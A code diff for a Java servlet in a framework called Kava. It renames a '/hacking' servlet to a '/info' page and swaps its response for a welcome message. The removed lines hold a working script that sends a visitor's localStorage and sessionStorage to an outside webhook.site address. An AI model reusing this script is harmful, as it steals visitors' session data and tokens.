@@ -1,22 +1,17 @@
-package com.example.model;
+package com.example;
 
 import com.kava.container.http.KavaHttpRequest;
 import com.kava.container.http.KavaHttpResponse;
 import com.kava.container.servlet.KavaServlet;
 import com.kava.container.servlet.KavaServletURI;
 
-@KavaServletURI("/hacking")
-public class HackingServlet extends KavaServlet {
+@KavaServletURI("/info")
+public class KavaExplained extends KavaServlet {
     @Override
     public void doGET(KavaHttpRequest request, KavaHttpResponse response) {
+        response.setBody("<h1>Welcome to <b>Kava</b>!</h1></br>Brand new Java web framework!");
         response.setStatusCode(200);
         response.setRequest(request);
-        response.setBody("""
-                <script>
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", 'https://webhook.site/2be266db-6275-4bb0-816c-2aece96e67ec', true);
-                xhr.send(JSON.stringify(localStorage) + ' ' + JSON.stringify(sessionStorage));
-                </script>""");
     }
 
     @Override
